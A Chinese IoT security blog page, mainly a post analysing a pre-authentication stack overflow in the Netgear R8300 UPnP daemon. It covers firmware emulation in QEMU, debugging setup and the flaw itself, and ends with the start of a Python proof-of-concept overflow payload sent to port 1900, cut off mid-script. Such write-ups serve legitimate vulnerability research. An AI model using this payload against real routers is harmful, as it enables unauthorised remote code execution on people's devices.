<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Looking <span class="keyword">for</span> possible strings starting at: 0x80001000</span><br><span class="line">Created 7500 new ASCII strings</span><br><span class="line"><span class="comment"># 还是7500个，看来没改变这个，只是在形式上讲单个byte转为了ascii字符串</span></span><br><span class="line"><span class="comment"># 失败的是因为在之前转换代码时，范围选择了从开始到结束，将字符串的00转为了代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否有必要精确转换代码/数据的范围？</span></span><br><span class="line"><span class="comment"># 没必要，如上，转换代码时选择了全部范围，尽管在转数据时有个别的失败，也无伤大雅</span></span><br><span class="line"><span class="comment"># 如果真要精确范围，代价太大，因为一个二进制文件可能代码和数据是混在一起的，不是前面代码后面数据，如果要范围，成本太大</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个create_ascii有啥意义呢？？感觉作用不大</span></span><br></pre></td></tr></table></figure>
<h2 id="04-逆向过程"><a href="#04-逆向过程" class="headerlink" title="04-逆向过程"></a>04-逆向过程</h2><h3 id="1-识别基本函数"><a href="#1-识别基本函数" class="headerlink" title="1-识别基本函数"></a>1-识别基本函数</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反汇编代码：</span></span><br><span class="line"><span class="comment"># # lui指令：把一个16位的立即数填入到寄存器的高16位，低16位补零</span></span><br><span class="line"><span class="comment"># 故lui     $a0, 1时a0=65525</span></span><br><span class="line">ROM:80003154                 addiu   <span class="variable">$sp</span>, -0x30</span><br><span class="line">ROM:80003158                 sw      <span class="variable">$s3</span>, 0x18+var_sC(<span class="variable">$sp</span>)</span><br><span class="line">ROM:8000315C                 move    <span class="variable">$s3</span>, <span class="variable">$a0</span></span><br><span class="line">ROM:80003160                 lui     <span class="variable">$a0</span>, 1<span class="comment">#65536</span></span><br><span class="line">ROM:80003164                 sw      <span class="variable">$s1</span>, 0x18+var_s4(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003168                 move    <span class="variable">$s1</span>, <span class="variable">$a1</span></span><br><span class="line">ROM:8000316C                 sw      <span class="variable">$s2</span>, 0x18+var_s8(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003170                 move    <span class="variable">$s2</span>, <span class="variable">$a2</span></span><br><span class="line">ROM:80003174                 sw      <span class="variable">$ra</span>, 0x18+var_s10(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003178                 jal     sub_802A7F90</span><br><span class="line">ROM:8000317C                 sw      <span class="variable">$s0</span>, 0x18+var_s0(<span class="variable">$sp</span>)</span><br><span class="line">ROM:80003180                 move    <span class="variable">$s0</span>, <span class="variable">$v0</span></span><br><span class="line">ROM:80003184                 bnez    <span class="variable">$s0</span>, loc_800031A4</span><br><span class="line">ROM:80003188                 lui     <span class="variable">$v0</span>, 0xBFC4</span><br><span class="line">ROM:8000318C                 li      <span class="variable">$a0</span>, aCanTAllocateDB  <span class="comment"># "Can't allocate %d bytes of memory\n"</span></span><br><span class="line">ROM:80003194                 jal     sub_802A06E8</span><br><span class="line">ROM:80003198                 lui     <span class="variable">$a1</span>, 1<span class="comment"># 65536</span></span><br><span class="line">ROM:8000319C                 j       loc_80003298</span><br><span class="line">ROM:800031A0                 li      <span class="variable">$v0</span>, 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪C</span></span><br><span class="line"><span class="keyword">if</span>(!sub_802A7F90(65536))</span><br><span class="line">&#123;</span><br><span class="line">   sub_802A06E8(<span class="string">"Can't allocate %d bytes of memory\n"</span>, 65536);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故猜测：sub_802A7F90为malloc，sub_802A06E8为printf</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/" class="post-title-link" itemprop="url">Netgear R8300认证前RCE的漏洞分析及利用</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-22 14:41:33" itemprop="dateCreated datePublished" datetime="2021-06-22T14:41:33+08:00">2021-06-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:16:46" itemprop="dateModified" datetime="2022-02-21T16:16:46+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="Netgear-R8300认证前RCE的漏洞分析及利用"><a href="#Netgear-R8300认证前RCE的漏洞分析及利用" class="headerlink" title="Netgear R8300认证前RCE的漏洞分析及利用"></a>Netgear R8300认证前RCE的漏洞分析及利用</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>通告<ul>
<li>NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入</li>
<li>R8300 running firmware versions prior to 1.0.2.134（之前的有洞，此修复</li>
<li>（仅此而已，没有说明哪个程序</li>
<li>R8300 running firmware versions prior to 1.0.2.134（之前有洞，这个修复</li>
</ul>
</li>
<li>在有设备的情况下，有多种直接获取系统 shell 的方式，如：<ol>
<li>硬件调试接口，如：UART</li>
<li>历史 RCE 漏洞，如：NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞<a href="https://www.seebug.org/vuldb/ssvid-98253" target="_blank" rel="noopener">【3】</a></li>
<li>设备自身的后门，Unlocking the Netgear Telnet Console<a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" target="_blank" rel="noopener">【4】</a></li>
<li>破解固件检验算法，开启 telnet 或植入反连程序。</li>
</ol>
</li>
<li>无设备<ul>
<li>理论上，只要 CPU 指令集对的上，就可以跑起来，</li>
<li>所以我们还可以利用手头的树莓派、路由器、摄像头的开发板等来运行。</li>
<li>最后一个就是基于 QEMU 的指令翻译</li>
</ul>
</li>
<li>文件夹对比找到有漏洞的二进制<ul>
<li>win的ultraCompare、Linux的meld（均不建议</li>
<li>自写py脚本</li>
<li>收集关键二进制及其目录，如upnpd、httpd，如/usr/sbin</li>
</ul>
</li>
<li>file usr/sbin/upnpd：ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<ul>
<li>LSB：小端</li>
<li>ARM, EABI5： <code>ARMv5</code> 架构</li>
<li>dynamically linked：动态链接</li>
<li>stripped：去除了符号表</li>
</ul>
</li>
<li>其他<ul>
<li>armel和armhf都是小端，hf-hard float，需要硬件支持，可简单理解为后者比前者新（使用时未发现区别</li>
<li>qemu所需镜像：<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></li>
</ul>
</li>
</ul>
<h2 id="qemu虚拟机"><a href="#qemu虚拟机" class="headerlink" title="qemu虚拟机"></a>qemu虚拟机</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. sudo tunctl -t tap0 -u `whoami`（创建tap接口、需事先sudo apt install uml-utilities</span><br><span class="line">2. sudo ifconfig tap0 192.168.1.1/24（为新创建的tap接口配置IP、配置后ifconfig可见</span><br><span class="line">3. qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line">	（为方便封装在sh文件中、-M vexpress-a9指定架构、-kernel vmlinuz指定内核、-initrd指定init文件、file=指定镜像文件、-net tap指定接口类型，ifname=tap0接口名字、-nographic设置无界面</span><br><span class="line">4. root-root登录</span><br><span class="line">5. ifconfig eth0 192.168.1.2/24（为qemu虚拟机网卡分配IP</span><br><span class="line">6. ping 192.168.1.1（测试连通性</span><br><span class="line">7. tar -cvf 1.tar ./squashfs-root、scp -r 1.tar root@192.168.1.2:/root/（tar+scp传送squashfs-root，或wget+tar+py_server，最好打包</span><br><span class="line">8. mount -t proc /proc ./squashfs-root/proc;mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev（挂载proc、dev</span><br><span class="line">9. chroot ./squashfs-root/ sh（chroot并开启sh</span><br></pre></td></tr></table></figure>
<h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><ol>
<li>直接运行，没有任何输出，且ps没有</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/sbin/upnpd </span></span><br><span class="line"><span class="comment"># ps |grep upnp |grep -v grep</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>没有报错信息就没法定位，sh脚本搭建调试环境，<a href="https://paper.seebug.org/480/#_5" target="_blank" rel="noopener">https://paper.seebug.org/480/#_5</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 </span></span><br><span class="line"><span class="comment"># cat start_debug.sh </span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">pid=`ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="variable">$pid</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">/usr/sbin/upnpd</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line"><span class="comment"># [  ]表示条件测试。注意这里的空格很重要。要注意在'['后面和']'前面都必须要有空格</span></span><br><span class="line"><span class="comment"># 等号左右不能有空格，pid=`ps | grep -v grep | grep upnpd | awk '&#123;print $1&#125;'`</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line"><span class="comment"># 选择对应的gdbserver：gdbserver-7.7.1-armel-eabi5-v1-sysv</span></span><br><span class="line">$ file usr/sbin/upnpd </span><br><span class="line">usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">$ file gdbserver-7.7.1-armel-eabi5-v1-sysv </span><br><span class="line">gdbserver-7.7.1-armel-eabi5-v1-sysv: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.26, BuildID[sha1]=589acbdf7b460493b7e40d618c5389a0a2dc24e1, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 </span></span><br><span class="line"><span class="comment"># 查看gdbserver用法</span></span><br><span class="line">qemu-arm gdbserver-7.7.1-armel-eabi5-v1-sysv --<span class="built_in">help</span></span><br><span class="line">Usage:</span><br><span class="line">	gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># ./start_debug.sh</span></span><br><span class="line"><span class="comment"># 总是打印gdbserver帮助信息，就是upnp没执行起来，ps+grep+awk没找到pid</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>找报错信息2法：sh+gdbserver搭建调试环境、qemu的–strace选项</li>
<li>qemu 添加<code>--strace</code>选项, 方便查看错误信息, 便于环境修复：<a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># chroot与qemu的-L选项还是有区别的</span></span><br><span class="line">sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br><span class="line">4147 open(<span class="string">"/var/run/upnpd.pid"</span>,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</span><br><span class="line">4147 <span class="built_in">exit</span>(2)</span><br><span class="line"></span><br><span class="line">sudo ./qemu-arm-static -L . --strace ./usr/sbin/upnpd</span><br><span class="line">4153 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4153 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 先用chroot法，mkdir后再运行</span></span><br><span class="line">lrwxrwxrwx  1 lxl lxl       7 Nov  9 09:53 var -&gt; tmp/var</span><br><span class="line">mkdir -p tmp/var/run</span><br><span class="line"></span><br><span class="line">4160 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4160 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># chroot + mkdir == —L的结果，因此倾向—L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 要解决nvram的问题，需要交叉编译libnvram，暂搁置//here</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>qemu找到原因，mkdir -p tmp/var/run解决，继续qemu虚拟机中（<a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 固件模拟时很常见的nvram问题</span></span><br><span class="line">/usr/sbin/upnpd </span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 现成的模拟nvram：https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 交叉编译，尽管有warning但是成功了</span></span><br><span class="line">/opt/cross_compile/armv5l/bin/armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 缺少dlsym</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so"</span> /usr/sbin/upnpd</span><br><span class="line">/usr/sbin/upnpd: can<span class="string">'t resolve symbol '</span>dlsym<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ grep -r "dlsym" .</span></span><br><span class="line"><span class="string">Binary file ./lib/libdl.so.0 matches</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span></span><br><span class="line"><span class="string">26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>配置/tmp/nvram.ini</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 新建/tmp/nvram.ini</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x01b52008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76f38c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00000000</span><br><span class="line">Cannot open /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line">touch /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 在nvram.ini中填充键值对</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76e96c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00cfe008</span><br><span class="line">[nvram 0]  = </span><br><span class="line">Read 1 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">'upnpd_debug_level'</span>) = <span class="string">''</span></span><br><span class="line">[0x0000e1e8] fopen(<span class="string">'/www/Public_UPNP_gatedesc.xml'</span>, <span class="string">'rb'</span>) = 0x00cfe008</span><br><span class="line">[0x0000e220] fopen(<span class="string">'/tmp/upnp_xml'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0000f520] acosNvramConfig_get(<span class="string">'lan_ipaddr'</span>) = <span class="string">''</span></span><br><span class="line">[0x76dd2838] acosNvramConfig_get(<span class="string">'hwrev'</span>) = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cat tmp/nvram.ini </span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.1.2</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br><span class="line"><span class="comment"># lan_ipaddr要改成自己对应的</span></span><br></pre></td></tr></table></figure>
<ol start="7">
<li>成功</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印信息的同时，也可以输入命令</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">ps |grep upnpd</span><br><span class="line"> 2513 0          3292 S   /usr/sbin/upnpd </span><br><span class="line"> 2522 0          1296 S   grep upnpd</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>小结<ol>
<li>sh脚本+gdbserver搭建调试环境</li>
<li>qemu的strace选项</li>
<li>交叉编译nvram.so</li>
<li>编辑nvram.ini</li>
</ol>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
<li>/usr/sbin/upnpd，1900端口</li>
<li>recvfrom()、strcpy()</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://man7.org/linux/man-pages/man2/recvfrom.2.html</span></span><br><span class="line">recv, recvfrom, recvmsg - receive a message from a socket</span><br><span class="line">ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span><br><span class="line">                        struct sockaddr *src_addr, socklen_t *addrlen);                     </span><br><span class="line"><span class="comment"># 从socket中接受长度为len的数据，保存到buf中</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>IDA看成因（而非ghidra，ida可变量高亮、看出局部变量大小</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 接受长度为0x1FFFu的数据，保存到v54</span></span><br><span class="line">v27 = recvfrom(dword_C4580, v54, 0x1FFFu, 0, (struct sockaddr *)&amp;v62, (socklen_t *)&amp;v70);</span><br><span class="line"><span class="comment"># 2 v54作为参数1传入</span></span><br><span class="line">sub_25E04(v54, (int)&amp;v58, (unsigned __int16)(HIWORD(v62) &lt;&lt; 8) | (unsigned __int16)(HIWORD(v62) &gt;&gt; 8));</span><br><span class="line"><span class="comment"># 3 局部变量大小 0x634 - 0x58 = 0x5dc，小于0x1FFFu</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]</span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>通过 <code>checksec</code> 可知程序本身只开了 NX 保护，从原漏洞详情得知 R8300 上开了 ASLR</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ checksec usr/sbin/upnpd</span><br><span class="line">[*] <span class="string">'/home/lxl/Desktop/8/squashfs-root/usr/sbin/upnpd'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"><span class="comment"># NX是针对程序的，ASLR是针对设备/系统的</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>构造payload</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x7e2da53c</span>) +  <span class="comment"># v41</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># LR</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line">g = <span class="keyword">lambda</span> 